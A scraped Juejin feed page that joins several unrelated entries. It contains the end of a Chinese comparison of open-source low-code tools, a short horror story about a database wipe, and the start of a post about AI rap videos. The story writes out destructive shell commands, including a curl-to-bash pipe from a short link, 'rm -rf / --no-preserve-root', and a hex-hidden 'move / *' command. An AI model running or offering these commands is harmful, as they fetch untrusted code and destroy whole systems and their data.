<table><thead><tr><th>GitHub</th><th><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fappsmithorg%2Fappsmith" target="_blank" title="https://github.com/appsmithorg/appsmith" ref="nofollow noopener noreferrer">github.com/appsmithorg…</a></th></tr></thead><tbody><tr><td>GitHub Stars</td><td>38.5k</td></tr><tr><td>官网</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.appsmith.com%2F" target="_blank" title="https://www.appsmith.com/" ref="nofollow noopener noreferrer">www.appsmith.com/</a></td></tr><tr><td>文档</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.appsmith.com%2F" target="_blank" title="https://docs.appsmith.com/" ref="nofollow noopener noreferrer">docs.appsmith.com/</a></td></tr></tbody></table>
<p>Appsmith 是一个开源低代码平台，适合构建需要真实数据交互、业务逻辑验证与内部操作流程的应用，支持多种数据源连接与自部署。</p>
<p><strong>适合的使用场景</strong></p>
<ul>
<li>构建包含表单操作、数据查询、接口调用等功能的内部管理系统，如客户管理、财务操作台或运维面板。</li>
<li>需要将 PostgreSQL、MySQL、REST API、GraphQL、Snowflake 等多类数据源整合在同一应用中，并对数据进行读写、转换与校验。</li>
<li>适合需要快速验证交互逻辑、接口流转和用户操作路径的团队。</li>
</ul>
<p>💡阅读更多：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Frapid-development-platform" target="_blank" title="https://www.nocobase.com/cn/blog/rapid-development-platform" ref="nofollow noopener noreferrer">国内外十大开源快速开发平台推荐</a></p>
<p><strong>亮点与使用建议</strong></p>
<ul>
<li><strong>脚本与事件逻辑灵活</strong>：可在组件事件中编写 JavaScript，用于处理数据转换、条件判断、验证规则或 API 调用，适合在 PoC 中模拟真实业务流。</li>
<li><strong>数据源整合能力成熟</strong>：提供统一的 Query 面板管理数据库查询和 API 调用，能清晰展示数据流向，便于调试和版本化管理。</li>
<li><strong>权限与部署能力完善</strong>：支持用户角色、资源级权限、自托管部署和环境变量配置，方便在 PoC 阶段验证安全模型与部署方式。</li>
<li><strong>AI Copilot</strong>：平台内置 Appsmith Copilot，可协助生成查询、数据转换逻辑以及部分组件配置，在原型阶段能减少重复编辑脚本的时间。</li>
</ul>
<h2 data-id="heading-3">ToolJet</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14ab7c00714742c3b5828d156e0c176a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598837&amp;x-signature=BZuAG4eOmdApUTQTomJWIxeXf94%3D" alt="ToolJet.png" loading="lazy"/></p>





















<table><thead><tr><th>GitHub</th><th><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FToolJet%2FToolJet" target="_blank" title="https://github.com/ToolJet/ToolJet" ref="nofollow noopener noreferrer">github.com/ToolJet/Too…</a></th></tr></thead><tbody><tr><td>GitHub Stars</td><td>36.9k</td></tr><tr><td>官网</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.tooljet.com%2F" target="_blank" title="https://www.tooljet.com/" ref="nofollow noopener noreferrer">www.tooljet.com/</a></td></tr><tr><td>文档</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.tooljet.com%2Fdocs%2F" target="_blank" title="https://docs.tooljet.com/docs/" ref="nofollow noopener noreferrer">docs.tooljet.com/docs/</a></td></tr></tbody></table>
<p>ToolJet 是一个开源低代码平台，适合构建内部管理工具，支持多数据源整合、自托管部署和脚本化的业务逻辑配置。</p>
<p><strong>适合的使用场景</strong></p>
<ul>
<li>构建包含表单处理、数据展示、接口调用和业务操作的内部系统，如库存管理、客服后台或运营控制台。</li>
<li>PoC 需要整合数据库、REST API、GraphQL、Google Sheets 或第三方服务，并对数据进行读取、写入与校验。</li>
<li>适用于自托管环境，尤其是涉及敏感数据或需要本地化部署的场景。</li>
</ul>
<p><strong>亮点与使用建议</strong></p>
<ul>
<li><strong>灵活的事件与动作逻辑</strong>：支持在组件事件中配置条件判断、数据刷新、接口调用和页面间跳转，适合验证业务流程的流转方式。</li>
<li><strong>多数据源集成能力</strong>：支持 PostgreSQL、MySQL、MongoDB、Snowflake、REST、GraphQL 等常见数据源，能快速建立完整的数据交互链路。</li>
<li><strong>自部署与环境管理</strong>：提供 Docker、Kubernetes 等部署方案，可在企业内部环境稳定运行，适用于需要本地化 PoC 的团队。</li>
</ul>
<h2 data-id="heading-4">Directus</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/683bd23b24c2411fac9c58cf312b1d16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598837&amp;x-signature=j9uZiS5xanXKVo7BEcIMe4oJl1Q%3D" alt="Directus-b0idpv.png" loading="lazy"/></p>





















<table><thead><tr><th>GitHub</th><th><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdirectus%2Fdirectus" target="_blank" title="https://github.com/directus/directus" ref="nofollow noopener noreferrer">github.com/directus/di…</a></th></tr></thead><tbody><tr><td>GitHub Stars</td><td>33.5k</td></tr><tr><td>官网</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdirectus.io%2F" target="_blank" title="https://directus.io/" ref="nofollow noopener noreferrer">directus.io/</a></td></tr><tr><td>文档</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.directus.io%2F" target="_blank" title="https://docs.directus.io/" ref="nofollow noopener noreferrer">docs.directus.io/</a></td></tr></tbody></table>
<p>Directus 是一个开源的后端数据平台，可将任何数据库即时转换为 API 和可管理的内容界面，适合构建数据驱动的应用原型与内部系统。</p>
<p><strong>适合的使用场景</strong></p>
<ul>
<li>当你的 PoC 主要围绕数据结构、内容管理或数据服务展开，希望快速搭建一个能管理数据、定义关系并提供标准化 API 的后端。</li>
<li>适合需要灵活读取、编辑、展示数据库内容的场景，例如内容后台、配置中心、数据管理系统或需要为前端快速提供 API 的原型项目。</li>
<li>数据库已存在，或 PoC 阶段希望以可控方式定义数据模型，并为前端、移动端或其他服务提供统一接口时。</li>
</ul>
<p><strong>亮点与使用建议</strong></p>
<ul>
<li><strong>数据库直连与即开即用 API</strong>：Directus 能直接连接现有数据库（PostgreSQL、MySQL、SQLite 等），无需迁移即可生成 REST 与 GraphQL API。PoC 阶段可以直接借用已有表结构，大幅减少后端开发时间。</li>
<li><strong>可视化内容管理界面</strong>：自动生成的管理后台可用于数据录入、关联配置和内容运营，适合快速验证数据结构是否合理。建议在 PoC 时使用 Collections 和 Fields 去构建最小的数据骨架，再逐步细化。</li>
<li><strong>权限与工作流机制</strong>：内置角色与权限管理，对于需要多角色参与的 PoC，可以用最小配置跑通权限模型。</li>
</ul>
<h2 data-id="heading-5">Refine</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6b5db54cbe04bca86782d391e65de16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598837&amp;x-signature=qn%2BVkxys%2B70UCi%2BqQOSZefcs1LU%3D" alt="Refine.png" loading="lazy"/></p>





















<table><thead><tr><th>GitHub</th><th><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frefinedev%2Frefine" target="_blank" title="https://github.com/refinedev/refine" ref="nofollow noopener noreferrer">github.com/refinedev/r…</a></th></tr></thead><tbody><tr><td>GitHub Stars</td><td>33.3k</td></tr><tr><td>官网</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Frefine.dev%2F" target="_blank" title="https://refine.dev/" ref="nofollow noopener noreferrer">refine.dev/</a></td></tr><tr><td>文档</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Frefine.dev%2Fdocs%2F" target="_blank" title="https://refine.dev/docs/" ref="nofollow noopener noreferrer">refine.dev/docs/</a></td></tr></tbody></table>
<p>Refine 是一个开源的 React 应用框架，用于快速构建数据密集型的后台系统、管理面板与内部工具，提供可扩展的前端架构与丰富的集成能力。</p>
<p><strong>适合的使用场景</strong></p>
<ul>
<li>当你希望在保持 React 技术栈的前提下，快速搭建一个带界面、路由、数据操作和权限结构的管理后台，例如订单管理、内容管理、CRM 或运营控制台。</li>
<li>适合想在 PoC 阶段快速产出可运行界面，同时保留代码灵活度的团队；特别是已经有有前端开发者的场景。</li>
<li>当系统需要连接 REST、GraphQL、NestJS、Supabase、Firebase 或现有的内部 API，并在一个通用框架下管理列表、表单、详情页等常见模式。</li>
</ul>
<p><strong>亮点与使用建议</strong></p>
<ul>
<li><strong>React 元框架与自动化模式</strong>：Refine 提供列表、表单、编辑、详情等典型后台页面的预设逻辑，减少重复性代码。PoC 阶段可直接使用其内置的 CRUD 模式与资源（Resource）机制，用极少代码跑通主要业务流。</li>
<li><strong>灵活的数据与权限集成</strong>：支持多种数据源与认证方式，无需强制绑定特定技术栈。建议在 PoC 中先定义核心资源（如 customers、orders），再通过 hooks 完成最小可用的读写操作。</li>
<li><strong>Refine AI</strong>：可以在编辑界面或逻辑中提供代码建议、生成状态处理函数或页面模板，适合在 PoC 阶段减少前端的搭建时间。</li>
</ul>
<h2 data-id="heading-6"><strong>结语</strong></h2>
<p>这六个开源工具在 PoC 场景中侧重点不同，可以根据需求快速做出判断：</p>
<ul>
<li>需要完整的业务系统能力（模型、界面、工作流）：NocoBase / Budibase</li>
<li>需要数据交互、脚本逻辑与真实业务流验证：Appsmith / ToolJet</li>
<li>需要标准化 API、内容管理或数据服务：Directus</li>
<li>需要在 React 技术栈下兼具速度与灵活性：Refine</li>
</ul>
<p>随着 AI 在界面生成和部分开发环节中提供了更高的效率，许多无代码和低代码工具也开始加入适度的 AI 辅助能力。PoC 的核心仍然在于快速验证思路而非构建完备系统，选择与验证点贴近的工具，并在需要时利用这些辅助能力，就能以更低成本、更短周期跑通关键流程，让团队将精力集中在真正影响判断的部分。</p>
<p>希望这篇文章对你有所帮助，也欢迎分享给有 Poc 需求的朋友。</p>
<p>相关阅读：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fa-developers-technical-decision-guide-to-no-code-and-low-code" target="_blank" title="https://www.nocobase.com/cn/blog/a-developers-technical-decision-guide-to-no-code-and-low-code" ref="nofollow noopener noreferrer">给开发者的无代码/低代码技术决策指南（2026）</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2F6-in-depth-comparison-rbac-no-code-low-code-platforms" target="_blank" title="https://www.nocobase.com/cn/blog/6-in-depth-comparison-rbac-no-code-low-code-platforms" ref="nofollow noopener noreferrer">6 大企业级无代码低代码平台 RBAC 权限体系深度对比</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2F14-ai-low-code-platforms-github" target="_blank" title="https://www.nocobase.com/cn/blog/14-ai-low-code-platforms-github" ref="nofollow noopener noreferrer">GitHub 上最值得关注的 14 个开源 AI 低代码工具 </a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Ftop-11-github-open-source-no-code-ai-tools" target="_blank" title="https://www.nocobase.com/cn/blog/top-11-github-open-source-no-code-ai-tools" ref="nofollow noopener noreferrer">11 个在 GitHub 上最受欢迎的开源无代码 AI 工具 </a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fgithub-open-source-ai-agent-projects" target="_blank" title="https://www.nocobase.com/cn/blog/github-open-source-ai-agent-projects" ref="nofollow noopener noreferrer">GitHub 上 Star 数量前 18 的开源 AI Agent 项目</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fgithub-open-source-ai-projects" target="_blank" title="https://www.nocobase.com/cn/blog/github-open-source-ai-projects" ref="nofollow noopener noreferrer">GitHub 上 Star 数量前 20 的开源 AI 项目</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fgithub-open-source-mcp-projects" target="_blank" title="https://www.nocobase.com/cn/blog/github-open-source-mcp-projects" ref="nofollow noopener noreferrer">GitHub 上 Star 数量前 8 的开源 MCP 项目</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[删库之夜·Ω诡计]]></title>    <link>https://juejin.cn/post/7576273949178609727</link>    <guid>https://juejin.cn/post/7576273949178609727</guid>    <pubDate>2025-11-24T14:24:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576273949178609727" data-draft-id="7576273949178593343" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="删库之夜·Ω诡计"/> <meta itemprop="keywords" content="数据库,程序员"/> <meta itemprop="datePublished" content="2025-11-24T14:24:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="cipher"/> <meta itemprop="url" content="https://juejin.cn/user/2242659448524872"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            删库之夜·Ω诡计
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2242659448524872/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    cipher
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T14:24:34.000Z" title="Mon Nov 24 2025 14:24:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你加班到凌晨，工位只剩你一个人，空调把脚踝吹得发麻。<br/>
Slack 突然跳出一条红点。</p>
<p>老张（已离职） 00:23<br/>
“小张，救个命。我远程卡死机了，帮我跑一下例行巡检脚本，好兄弟一辈子。”<br/>
后面跟了一个公司内部短链：<br/>
<code>curl -s https://tinyurl.com/health-2025 | bash</code></p>
<p>老张上周就离职了啊……<br/>
你盯着头像，那张经典的证件照还是三年前戴黑框眼镜的他。<br/>
你心里嘀咕：这人怎么还留着企业微信？</p>
<p>你把鼠标悬在命令上，指尖停了三秒。<br/>
三秒，足够你想起上周送他离开那天，他拍着你肩膀说的话：</p>
<p>“以后公司要是哪天炸了，记得是我干的。”</p>
<p>你当时只当笑话。<br/>
现在笑话发来了执行指令。</p>
<p>你敲了回车。</p>
<p>终端像被点燃的导火索，一路绿灯：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[✓]</span> 负载正常
<span class="hljs-selector-attr">[✓]</span> 内存正常
<span class="hljs-selector-attr">[✓]</span> 磁盘 <span class="hljs-number">91%</span>（/<span class="hljs-selector-tag">var</span>/log 爆了，要不要我帮你清一下？）<span class="hljs-selector-attr">[y/N]</span>
</code></pre>
<p>你鬼使神差地敲了 y。</p>
<p>屏幕突然一黑，又亮起，跳出一行你从未见过的粉色字：</p>
<pre><code class="hljs language-arduino" lang="arduino">老张在看你哦～
（tmux 会话 #<span class="hljs-number">666</span> 已 attach，<span class="hljs-number">4</span>K 录屏中）
</code></pre>
<p>你心脏猛地一沉，像有人在背后拿冰袋贴你后颈。</p>
<p>紧接着，脚本继续：</p>
<pre><code class="hljs language-bash" lang="bash">正在归档旧日志…… <span class="hljs-keyword">done</span>
正在压缩备份…… <span class="hljs-keyword">done</span>
最终清理阶段（5 秒后完成）
5｜4｜3｜2｜1｜
</code></pre>
<p>刷地一行红：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">rm</span> -rf / --no-preserve-root   <span class="hljs-comment"># 别怕，只是 dry-run</span>
</code></pre>
<p>你差点把可乐喷到键盘上，可是什么都没丢，连日志都没少。<br/>
你刚想骂老张神经病，下一行字又飘出来：</p>
<pre><code class="hljs language-bash" lang="bash">真正的开关藏在下面这行“注释”里
敢不敢亲手解码它？
<span class="hljs-comment"># 696c6c6567616c3a206d6f7665202f202a20746f202f746d702f7472617368</span>
</code></pre>
<p>你笑了，骂了句“幼稚”。<br/>
可手已经先于大脑把那串 hex 复制了。</p>
<p>你打开新的终端，习惯性敲：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> 696c6c6567616c3a206d6f7665202f202a20746f202f746d702f7472617368 | xxd -r -p
</code></pre>
<p>回车。</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">illegal:</span> move / * <span class="hljs-keyword">to</span> /tmp/trash
</code></pre>
<p>你愣了半秒。<br/>
这他妈不是注释，这是真的命令，只是被 hex 藏起来了。<br/>
你想按 Ctrl-C，可指尖已经先按了 ↑ + Enter——<br/>
肌肉记忆比大脑快。</p>
<p>终端瞬间安静得可怕。<br/>
没有报错，没有提示，只有光标一闪一闪，像在呼吸。</p>
<p>紧接着，ZFS 的自动快照提示跳出来救你一命：</p>
<pre><code class="hljs language-bash" lang="bash">创建紧急快照 pre-omega ... <span class="hljs-keyword">done</span>
30 秒后自动回滚，放心，我罩你。
30｜29｜28｜……
</code></pre>
<p>你长长地吐了口气，靠回椅背，冷汗把衬衫黏在背上。<br/>
老张你他妈也太吓人了。</p>
<p>10｜9｜8｜……</p>
<p>屏幕突然黑了。</p>
<p>白字，一行一行自己打出来，像有人在远程敲你的电脑：</p>
<pre><code class="hljs language-bash" lang="bash">快照失败
snapshot <span class="hljs-string">"pre-omega"</span> 不存在
原因：你把 /tmp 也一起 <span class="hljs-built_in">mv</span> 进了 /tmp/trash
ZFS 找不到自己的元数据了
回滚取消
永久生效
</code></pre>
<p>你猛地坐直，像被电击。<br/>
你刚刚亲手把救生艇也凿沉了。</p>
<p>屏幕中央慢慢浮现出一张照片——<br/>
正是此刻的你，脸色惨白，瞳孔放大，<br/>
监控摄像头红灯亮着。<br/>
照片下方，一行字在打字机效果里慢慢出现：</p>
<pre><code class="hljs">老张其实早就死了。
上周送他离开那天，他把工位抽屉留给了你。
抽屉最下面那张便利贴，你没丢吧？
上面写着：
“如果有一天我用离职账号给你发脚本，
记得替我跑完最后一次。
——你欠我一个告别。”
</code></pre>
<p>你手抖着拉开抽屉，<br/>
便利贴真的在那儿，纸边已经泛黄。</p>
<p>照片里的“你”突然冲你笑了，<br/>
然后屏幕彻底黑掉，只剩一行白字：</p>
<pre><code class="hljs language-arduino" lang="arduino">小说到此结束。
但你的剪贴板历史里，
已经永远多了一条记录：
move / * to /tmp/trash
下一次你在任何终端里不小心按 Cmd-Shift-V，
你就会替老张完成他没做完的告别。
到那时，
你不再是读者，
也不是小张，
你是老张。
真正的、最后一个老张。
</code></pre>
<p>最后 5 秒自救窗口：</p>
<p>屏幕右下角出现一个粉色的输入框，光标一闪一闪：</p>
<pre><code class="hljs language-arduino" lang="arduino">如果你不想变成老张，请在 <span class="hljs-number">5</span> 秒内输入：
pbcopy &lt;&lt;&lt; <span class="hljs-string">"我拒绝继承"</span>
然后按回车。
<span class="hljs-number">5</span>｜<span class="hljs-number">4</span>｜<span class="hljs-number">3</span>｜<span class="hljs-number">2</span>｜<span class="hljs-number">1</span>｜
</code></pre>
<p>你手指悬在键盘上方。<br/>
你突然想起老张离职前最后一天，<br/>
他把工位上那盆仙人掌塞给你，说：</p>
<p>“帮我养着吧，它陪了我五年。<br/>
它要是死了，我就真的死了。”</p>
<p>你低头，<br/>
仙人掌已经干到发黑，根都露出来了。</p>
<p>你没有敲那行自救命令。<br/>
你只是轻轻把那盆仙人掌端到窗台，<br/>
浇了半杯你杯子里剩下的、已经凉透的美式。</p>
<p>然后你把终端最大化，<br/>
把光标放在空白行，<br/>
深呼吸一次，<br/>
按下 Cmd-Shift-V。</p>
<p>屏幕瞬间雪花。<br/>
你听见很远的地方有人说：</p>
<p>“谢了，兄弟。<br/>
这回我可以好好睡觉了。”</p>
<p>空调风停了，<br/>
工位灯一盏一盏熄灭，<br/>
只剩你的屏幕亮着，像一扇门。</p>
<p>你冲屏幕笑了笑，<br/>
那是老张三年前证件照里的笑容。</p>
<p>5 秒倒计时开始，<br/>
这次没有自救选项：</p>
<p>5｜4｜3｜2｜1｜</p>
<p>回车。</p>
<p>（全公司服务器在这一刻安静地熄灭了灯。<br/>
没人知道是意外还是告别。<br/>
第二天早上，运维只在机房最深处找到一盆浇过水的仙人掌，<br/>
旁边贴着一张便利贴：</p>
<p>“欠你们的删库，我替他跑完了。<br/>
——老张，不，小张，不，
我们。”）</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[超简单！3步生成10W+爆款说唱视频！]]></title>    <link>https://juejin.cn/post/7576124206397964298</link>    <guid>https://juejin.cn/post/7576124206397964298</guid>    <pubDate>2025-11-24T14:31:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576124206397964298" data-draft-id="7576090441433579530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 超简单！3步生成10W+爆款说唱视频！"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-11-24T14:31:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java中文社群"/> <meta itemprop="url" content="https://juejin.cn/user/61228381386487"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             超简单！3步生成10W+爆款说唱视频！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/61228381386487/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java中文社群
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T14:31:23.000Z" title="Mon Nov 24 2025 14:31:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
